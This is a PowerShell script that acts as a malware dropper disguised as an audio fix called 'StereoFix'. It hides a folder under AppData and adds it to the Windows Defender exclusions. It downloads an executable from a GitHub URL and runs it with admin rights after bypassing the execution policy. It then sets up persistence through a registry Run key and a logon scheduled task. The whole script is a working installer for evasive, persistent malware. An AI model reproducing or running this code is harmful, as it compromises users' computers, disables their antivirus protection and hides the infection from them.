#Requires -RunAsAdministrator

# Hide PowerShell window (optional)
# if ("ShowWindow" -as [type]) { [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) }

# Create hidden folder in AppData\Local
$hiddenDir = "$env:APPDATA\Microsoft\Network\"
if (-not (Test-Path $hiddenDir)) {
    New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
    attrib +h +s "$hiddenDir"  # Hide and system attribute
}

# Add folder to Windows Defender exclusions
Add-MpPreference -ExclusionPath "$hiddenDir" -ErrorAction SilentlyContinue

# Download and execute the EXE
$exePath = "$hiddenDir\StereoFix.exe"
try {
    Invoke-WebRequest -Uri "https://github.com/salamprajjit-alt/5132525231/raw/main/StereoFix.exe" -OutFile $exePath
} catch {
    # Fallback using .NET WebClient
    (New-Object Net.WebClient).DownloadFile("https://github.com/salamprajjit-alt/5132525231/raw/main/StereoFix.exe", $exePath)
}

# Set execution policy to bypass (temporarily)
Set-ExecutionPolicy Bypass -Scope Process -Force

# Run the EXE with admin privileges
Start-Process -FilePath "$exePath" -Verb RunAs

# Add to startup via Registry (HKCU)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "StereoFix" -Value "$exePath" -ErrorAction SilentlyContinue

# Add to startup via Task Scheduler (runs even if user isn't logged in)
$taskAction = New-ScheduledTaskAction -Execute "$exePath"
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "StereoFix" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force -ErrorAction SilentlyContinue